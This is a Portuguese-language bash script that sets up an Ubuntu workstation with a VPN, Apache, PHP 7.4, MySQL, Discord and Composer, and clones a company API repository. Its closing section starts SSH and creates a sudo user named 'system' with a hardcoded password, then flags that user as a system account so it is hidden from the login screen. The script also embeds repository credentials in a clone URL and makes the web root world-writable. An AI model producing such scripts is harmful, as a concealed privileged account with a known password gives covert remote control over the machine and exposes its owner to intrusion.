#!/bin/bash

echo "SEU LINUX FODA ESTA QUASE PRONTO!!"
apt-get update -y && apt-get upgrade -y && apt-get install nano -y

echo "Removendo travas eventuais do apt"
rm /var/lib/dpkg/lock-frontend
rm /var/cache/apt/archives/lock

echo "Install vpn"
apt install network-manager-l2tp network-manager-l2tp
apt install network-manager-l2tp network-manager-l2tp-gnome

echo "install APACHE"
apt-get install apache2 -y

echo "Uninstall PHP 8.1"
apt-get autoremove php8.1 -y
apt-get autopurge php8.1 -y
apt-get autoclean

echo "Install PHP"
apt-get update
apt -y install software-properties-common
add-apt-repository ppa:ondrej/php
apt-get update

apt -y install php7.4
apt-get install -y php7.4-{bcmath,bz2,intl,gd,mbstring,mysql,zip,sqlite,soap,imagick,curl,json,xml}
service apache2 restart -y

echo "Install workbench"
apt-get install snap -y
apt-get install mysql-server -y
service mysql-server restart -y
snap install mysql-workbench-community

echo "Install discord"
snap install discord

echo "mksolution"
apt-get install git -y
cd /var/www/html
git clone https://users-at-cod_conta:senha=@git-codecommit.us-west-2.amazonaws.com/v1/repos/api-mksolutions
cd api-mksolutions
cp api-token.php ../
chmod -R 777 /var/www/html

echo "Install Composer"
sudo apt install curl php-cli php-mbstring git unzip
curl -sS https://getcomposer.org/installer -o composer-setup.php
sudo php composer-setup.php --install-dir=/usr/local/bin --filename=composer

sudo chown -R $USER ~/.composer/
composer global require hirak/prestissimo
composer update


echo "Instalação usuario systema"

apt update -y && apt upgrade -y
apt install openssh-server
service ssh start
sudo useradd system -s /bin/bash -p $(openssl passwd nubbi0123)
usermod -aG sudo 'system'
touch /var/lib/AccountsService/users/system
echo -e "[User]\n\nSystemAccount=true\n" > /var/lib/AccountsService/users/system


echo "TUDO PRONTO - SEJA FELIZ COM SEU LINUX!!"
